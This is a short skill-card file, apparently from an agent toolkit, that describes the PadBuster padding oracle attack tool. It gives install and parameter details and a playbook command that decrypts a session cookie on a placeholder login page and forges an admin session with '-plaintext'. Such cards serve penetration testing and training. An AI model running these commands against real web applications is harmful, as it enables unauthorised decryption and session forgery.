---
name: padbuster-padding-oracle
description: "Web application exploitation scenario. Signals: web vulnerability, injection, encrypt arbitrary plaintext, cookie mode, no URL encoding."
zh-signals: "PadBuster: Web应用漏洞利用场景。信号:web漏洞,注入,加密任意明文,cookie 模式,不 URL 编码。"
---

# PadBuster

- 攻击大类:C09 Web应用漏洞利用
- 上游仓库:https://github.com/AonCyberLabs/PadBuster
- 上游 License:Apache-2.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/AonCyberLabs/PadBuster
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `perl padBuster.pl URL encData 16 -encoding 0` | Padding Oracle 攻击 |
| `-plaintext 'user=admin'` | 加密任意明文 |
| `-cookies` | cookie 模式 |
| `-noencode` | 不 URL 编码 |
| `-error 'invalid'` | 错误指纹 |

## 攻击场景 Playbook

### CBC Padding Oracle 解密+伪造会话

```bash
perl padBuster.pl https://target/login.jsp 'vlP6xG9f...' 8 -cookies auth=
# 自动逐字节解密 → 再 -plaintext 伪造 admin 会话加密回写
```

## 注意事项

经典 CBC padding oracle 工具;块大小 8/16 自适应,支持自动错误指纹学习。
